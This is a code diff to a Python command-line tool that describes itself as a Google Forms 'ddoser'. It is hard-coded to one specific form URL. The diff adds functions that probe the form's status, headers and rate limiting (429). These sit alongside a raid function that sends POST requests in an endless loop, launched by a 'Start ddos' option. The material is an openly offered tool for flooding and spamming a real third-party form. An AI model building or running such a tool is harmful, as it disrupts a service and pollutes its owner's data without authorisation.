@@ -24,6 +24,28 @@ _link = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPU
 
 jojo = random.choice(random_num)
  
+def Response(a):
+    resp = requests.get("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse")
+    if a == "headers":
+        LogManager.info(resp.headers)
+    elif a == "content":
+        LogManager.info(resp.content)
+        
+def StatusCode():
+    resp = requests.get("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse")
+    res = resp.status_code
+        
+    if res == 200:
+        s = "OK === ReadyToPost"   
+    elif res == 429:
+        s = "TooManyRequests"
+    elif res == 405:
+        s = "MethotNotAllowed"
+    else:
+        s = "Undefined"
+        
+    LogManager.info(f"[{res}] {s}")
+ 
 def raid(a, b, c, d, e:int):
     while True:
         r = requests.post(_link,
@@ -74,13 +96,20 @@ def raid(a, b, c, d, e:int):
 @click.command()
 @click.option('--link', default = True, help = 'Show raiding link')
 @click.option('--raid', default = 3, help = 'Start ddos')
-def starter(link, raid):
+@click.option('--resp', default = None, help = "Get response")
+def starter(link, resp, raid):
     
     """Google Form`s ddoser script`s help`s command:\\//"""
     
     if link == "get":
         print("______  __    ______        \n___  / / /_______  /_______\n__  /_/ /_  _ \_  /___  __ \"\n_  __  / /  __/  / __  /_/ /\n/_/ /_/  \___//_/  _  .___/ \n                   /_/      \n")
         print(_link)
+    if resp == "headers":
+        Response("headers")
+    if resp == "content":
+        Response("content")
+    if resp == "status":
+        StatusCode()
     if raid == 1:
 
         print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
